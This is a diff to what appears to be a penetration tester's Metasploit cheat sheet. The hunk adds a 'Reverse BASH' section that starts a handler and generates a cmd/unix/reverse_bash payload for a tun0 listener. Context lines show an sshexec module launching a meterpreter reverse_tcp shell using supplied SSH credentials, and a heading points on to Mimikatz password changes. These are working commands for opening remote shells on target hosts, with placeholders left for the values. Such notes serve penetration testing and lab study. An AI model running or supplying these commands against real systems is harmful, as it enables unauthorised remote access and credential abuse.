@@ -362,6 +362,13 @@ use exploit/multi/ssh/sshexec
 run -o TARGET=1,PAYLOAD=linux/x64/meterpreter/reverse_tcp,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port>,RHOSTS=<ip>,USERNAME=<username>,PASSWORD=<password> <ip>
 ```
 
+# Reverse BASH
+```ruby
+handler -p cmd/unix/reverse_bash -H <tun0> -P <10000>
+use payload/cmd/unix/reverse_bash
+generate -f raw LHOST=<tun0> LPORT=<10000>
+```
+
 # Mimikatz
 ## Meterpreter
 ### Change password
